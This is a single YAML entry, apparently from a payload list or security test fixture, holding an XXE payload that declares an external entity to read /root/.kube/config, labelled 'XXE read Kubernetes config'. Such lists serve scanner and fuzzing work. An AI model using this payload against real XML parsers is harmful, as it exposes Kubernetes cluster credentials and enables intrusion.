    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.kube/config\">]><root>&xxe;</root>"
      description: "XXE read Kubernetes config"
